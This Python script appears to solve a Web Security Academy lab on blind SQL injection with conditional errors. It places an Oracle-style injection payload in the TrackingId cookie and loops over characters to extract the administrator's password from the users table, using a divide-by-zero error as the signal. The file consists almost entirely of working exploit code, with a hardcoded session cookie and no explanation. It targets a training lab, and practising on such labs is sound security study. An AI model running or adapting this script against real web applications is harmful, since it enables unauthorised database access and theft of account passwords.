import requests
import string

# Request Params:

url = "https://0add00ef041ef6ce8035a98600c00047.web-security-academy.net/filter"
trackingId ="FV1TanKwqLFHEpDX"

cookies = {
    'TrackingId': "FV1TanKwqLFHEpDX'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%201)%3d'b')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--",
    'session': 'vzmsExc9JpX8YBKIEuDr9dlVOrl2lYwV',
}

headers = {
    'Host': '0add00ef041ef6ce8035a98600c00047.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://0add00ef041ef6ce8035a98600c00047.web-security-academy.net/filter?category=Pets',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    # Requests doesn't support trailers
    # 'Te': 'trailers',
    # 'Cookie': "TrackingId=FV1TanKwqLFHEpDX'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%201)%3d'b')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--; session=vzmsExc9JpX8YBKIEuDr9dlVOrl2lYwV",
}

params = {
    'category': 'Food & Drink',
}

# Intruder code:

c_table = string.ascii_lowercase + string.digits
current= ""
password = ""

for i in range(1,21):
  
  for c in c_table:
    t = F"{trackingId}%20'%7c%7c(SELECT%20CASE%20WHEN%20(SUBSTR(password%2c1%2c%20{i})%3d'{current+c}')%20THEN%20TO_CHAR(1%2f0)%20ELSE%20NULL%20END%20FROM%20users%20WHERE%20username%3d'administrator')%20--"
    cookies['TrackingId'] = t
    response = requests.get(
      url,
      params=params,
      cookies=cookies,
      headers=headers,
      verify=False,
      )
    
    if 'Error' in response.text:
      current+=c
      print(current)
      break

  if password == current:
    print("PASSWORD: ", password)
    break
  else:
    password = current
